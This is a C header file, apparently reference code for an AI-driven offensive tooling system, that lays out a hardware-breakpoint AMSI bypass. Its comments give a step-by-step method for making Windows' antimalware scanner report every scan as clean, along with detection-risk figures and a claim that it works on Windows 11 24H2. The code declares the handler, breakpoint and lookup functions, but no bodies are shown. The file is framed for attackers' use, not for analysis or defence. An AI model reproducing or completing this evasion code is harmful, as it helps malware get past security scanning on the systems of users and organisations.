// Reference code for Noctis-MCP AI intelligence system
// VEH² (Vectored Exception Handler²) - Patchless AMSI Bypass
// Source: https://www.crowdstrike.com/en-us/blog/crowdstrike-investigates-threat-of-patchless-amsi-bypass-attacks/
// Research: Argus Red Team Intelligence Report 2024-2025
//
// TECHNIQUE: Hardware Breakpoint-Based AMSI Interception
// IMPROVEMENT: Zero memory patching, Windows 11 24H2 compatible
// DETECTION RISK: Low-Medium (20-25%) vs Memory Patching (50%+)
//
// How it works:
// 1. Register Vectored Exception Handler (VEH) for EXCEPTION_SINGLE_STEP
// 2. Set hardware breakpoint on amsi.dll!AmsiScanBuffer via debug register DR0
// 3. When AMSI scan occurs, breakpoint exception fires
// 4. VEH handler modifies RAX to AMSI_RESULT_CLEAN (0)
// 5. Clear trap flag, resume execution
// 6. AMSI reports clean scan without any memory modification
//
// Critical: Works on Windows 11 24H2 where memory patching fails

#ifndef VEH2_BYPASS_H
#define VEH2_BYPASS_H

#include <Windows.h>
#include <winternl.h>

// AMSI result codes
#define AMSI_RESULT_CLEAN           0
#define AMSI_RESULT_NOT_DETECTED    1
#define AMSI_RESULT_BLOCKED_BY_ADMIN 0x4000
#define AMSI_RESULT_DETECTED        32768

// Debug register indices (DR0-DR3 available for user-mode)
#define DR0_INDEX 0
#define DR1_INDEX 1
#define DR2_INDEX 2
#define DR3_INDEX 3

// Hardware breakpoint conditions
#define BREAK_ON_EXECUTION  0x0
#define BREAK_ON_WRITE      0x1
#define BREAK_ON_READWRITE  0x3

// Hardware breakpoint sizes
#define BREAK_SIZE_1_BYTE   0x0
#define BREAK_SIZE_2_BYTE   0x1
#define BREAK_SIZE_4_BYTE   0x3
#define BREAK_SIZE_8_BYTE   0x2

// VEH² context structure
typedef struct _VEH2_CONTEXT {
    PVOID pAmsiScanBufferAddr;      // Address of AmsiScanBuffer
    PVOID pVectoredHandler;         // VEH handler cookie
    BOOL bBypassActive;             // Whether bypass is currently active
    DWORD dwThreadId;               // Thread ID where bypass is active
} VEH2_CONTEXT, *PVEH2_CONTEXT;

// Initialize VEH² AMSI bypass
BOOL VEH2_Initialize(PVEH2_CONTEXT pContext);

// Enable hardware breakpoint on AmsiScanBuffer
BOOL VEH2_EnableBreakpoint(PVEH2_CONTEXT pContext);

// Disable hardware breakpoint
BOOL VEH2_DisableBreakpoint(PVEH2_CONTEXT pContext);

// Cleanup VEH and breakpoint
VOID VEH2_Cleanup(PVEH2_CONTEXT pContext);

// Internal: Vectored Exception Handler callback
LONG WINAPI VEH2_ExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo);

// Internal: Set hardware breakpoint using debug registers
BOOL VEH2_SetHardwareBreakpoint(
    HANDLE hThread,
    PVOID pAddress,
    DWORD dwRegisterIndex,
    DWORD dwCondition,
    DWORD dwSize
);

// Internal: Clear hardware breakpoint
BOOL VEH2_ClearHardwareBreakpoint(HANDLE hThread, DWORD dwRegisterIndex);

// Utility: Get AmsiScanBuffer address from amsi.dll
PVOID VEH2_GetAmsiScanBufferAddress(VOID);

#endif // VEH2_BYPASS_H
